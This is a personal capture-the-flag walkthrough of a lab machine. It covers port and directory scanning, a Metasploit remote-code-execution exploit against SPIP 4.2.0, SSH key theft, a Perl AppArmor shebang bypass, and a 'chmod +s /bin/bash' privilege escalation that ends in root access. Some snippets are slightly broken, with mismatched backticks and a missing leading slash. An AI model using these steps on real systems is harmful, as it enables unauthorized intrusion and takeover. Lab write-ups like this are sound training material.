**nmap -p- -T5 10.10.54.111 -v**
-->
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:C1:0E:44:3E:A9 (Unknown)

**nmap 80 -A 10.10.54.111 -v**
--> want to try the Apache wordlist 2.0 if it is apache
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)

```
**gobuster dir -u "10.10.54.111" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 24**
-->
starting gobuster in directory enumeration mode ===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.54.111/images/]
/spip                 (Status: 301) [Size: 311] [--> http://10.10.54.111/spip/]
/server-status        (Status: 403) [Size: 277]
Progress: 220557 / 220558 (100.00%)
```

/spip reveals some kind of platform?
This term was also all over the base website. 
Noted "spip" for possible searchsploit term.
Wappalyzer shows us what it's built with
![spipReveal1](https://github.com/user-attachments/assets/f3caf1b3-6fde-41e5-93f2-8b16dc753d33)

/images 
does not have any apparent upload place or path. Deemed low-priority since nothing from clicking around gave anything interesting.
Parent directory only went back to main webpage

![imagesDelegate2](https://github.com/user-attachments/assets/2843653d-5d8f-4326-b54a-a6d1b171fc30)


Trying that keyword before it slips my mind
go to searchsploit in console, check our keyword spop.
![eatmyshorts1](https://github.com/user-attachments/assets/8f8b7b0b-298b-4341-82df-828684bff97c)

found an RCE; ours is 4.2.0 as wappalyzer showed

In msfconsole, trying #12 as an RCE (remote code execution) matching the data we found in searchsploit... probably should've read the exploit DB ref on it.. hindsight 20/20.
After the exploit didn't catch a shell, read some more and tried 0. Seems I should prioritize what's listed at the top in terms of efficacy, all other factors being equal. It's also an unauthenticated RCE.
![try2](https://github.com/user-attachments/assets/56479015-ea18-4bfa-b56f-dadcccbbbd3f)


In options, setting TARGETURI is important, because we need the location for the web-app. On the page /spip wappalyzer showed us it was running, so, that's a good place to target.
RHOSTS is the target IP, same as a million other attack types...
check, port 80 is the target port we're hitting, and the LHOST is my atk machine, and 4444 has no interference or other service running on it, so it's good to go

![setup2gogog](https://github.com/user-attachments/assets/f3cc9e09-d5eb-4dd6-8422-00d4fbf465d3)


Exploit gives us a meterpreter session, which appears to be on the website itself. I'm looking for interesting files and directories I can now access.
![2navigationsUpToUsertext](https://github.com/user-attachments/assets/d411885c-0d4d-41b3-ba3e-b65db3fef86d)

Huh, I got a user-flag here in user.txt.
Oh, and ssh credentials. So if I get the key into another doc, I can use -i and that'll work as the password for an SSH login, even though this guy appears to be a user "think" and not "root".

![userflagGot2](https://github.com/user-attachments/assets/3163da86-bad7-4a17-81c3-bcad11db8f38)


Navigated into ssh, copied the rsa_key to a file "finkey" (arbitrary name and I was thinking about having fish for lunch, apparently).
if you get a message "bad permissions" in error, it's because you don't have the copied ssh-key-file marked as executable. Yeah, weird to have a text-file as executable, but it's part of the process.

![chmodForKeyfix1](https://github.com/user-attachments/assets/9287a056-884d-4530-af89-d53e163d73c8)


basic checks, history is a dud, crontab -l, dud.
Seems a lot of stuff has the suid bit set from 
**find / -type f -perm -04000 -ls 2>/dev/null**
(identified what can be run as root without being root, thus SUID is set, or set-able, I think, as we'll later see)

![findRootSUIDBitSet](https://github.com/user-attachments/assets/262c4234-f646-4f99-aa0b-063ae8661cd6)

Trying a GTFObin (shell escape) with "mount", but it doesn't work
![notmount](https://github.com/user-attachments/assets/84fced22-0bdc-4499-abf2-e86d33b79327)


newgroup and pkexec don't have easy GTFO bins that make sense...

After some time, run_container has some interesting behavior, running from /opt/run_container.sh.
We learn it's filetype from this, which was not mentioned in our find command, by the way.
![dataLeak1](https://github.com/user-attachments/assets/a9caf99c-9b3f-44cc-af18-0a5d7b018881)

If I cd into /opt , then I can try to read the contents of this .sh file to see what it's doing.

![runInTargetDirAndSUIDLetsUsCatTheContents](https://github.com/user-attachments/assets/490ce303-e0c5-4e4b-a522-b0efe443556b)

looking for a quick win, a few lines down, it appears to have a password? If they're reusing passwords, then this might work for sudo's pass, or for ssh.
possible pass: 4b5aec41d6ef
![notThePassword](https://github.com/user-attachments/assets/1431246a-290f-4786-a5bd-72ebb9997d2d)

It doesn't work.
Moving along.

Code for analysis of the run_container.sh 
(not much actually came from reading this for me, but a good report would have this in full)
```
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
	docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2) 	if [ $(docker ps -q | wc -l) -lt 2 ]; then
	            echo "No enough containers are currently running."
    	            exit 1
		fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
think@publisher:/opt$ 

```


Cut for tedium, but running LinPeas reveals a note about "app armor". I ended up reading about it on a German website... I understand enough german to get that you can overwrite code for arbitrary execution on a file you target with this method.

![shebangBypass1](https://github.com/user-attachments/assets/9be18bdd-263b-4832-9083-aabd2d36e270)

assuming i've made a dummy file allowing me to execute the command I want, called file.pl
```
echo `#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "bin/sh"` > /dev/shm/file.pl
chmod +x /dev/shm/file.pl
/dev/shm/file.pl
```
That bypass is typed in CLI by the way, not in our .sh file.

I tried to edit run_container.sh, and it wouldn't let me save.

cd into /opt ; needed because that's where run_container is; then we need to add superuser execution permissions, +s letting us use the SUID bit on the file so it auto-bypasses root password checks.
-->
echo `chmod +s /bin/bash >> run_container.sh
-->
then I went back and could edit run_container.sh and save it.
With enough "playing around with it" you can bypass the limit on file overwrites like I did. 

![strlK_cut_newFile](https://github.com/user-attachments/assets/63863336-be9d-4a03-8f78-adb739159aa5)

run the shebang bypass code, changing the directories to the correct pathing, and it'll give you a shell.
(mea culpa, did not document pathway, invoke rule of momentum)

Then command: run-container

![ergergr](https://github.com/user-attachments/assets/a3b0b2e9-c120-4938-bb0f-bd484383e123)


and it will execute whatever code is set up in there.
I grabbed the id_rsa key by deleting everything and looking around.
(I am skipping some tedious steps of typing in "ls -la" multiple times to do manual enumeration of looking into the files)
.ssh is helpful because with the id-rsa, I can login to ssh as root

below, the screenshot shows the code to write out the id_rsa key for root.

![modded23r32r](https://github.com/user-attachments/assets/66da082e-951b-4224-916f-59b7828d63fe)


I put the rsa key in a dummy file with nano (called the file potato)
![rigbiwerngre](https://github.com/user-attachments/assets/09b90626-4dae-4396-91f8-eda6b073009e)

chmod, then use it to login
**ssh -i potato root@10.10.54.111**
![putKeyINtoPotato](https://github.com/user-attachments/assets/96898d05-342a-458b-8728-e27a6921fef1)

and then I'm root on the system and it's a win

![blkouwergergergt](https://github.com/user-attachments/assets/c3acb227-03b8-43ee-b58f-5b3b8ce3ae53)
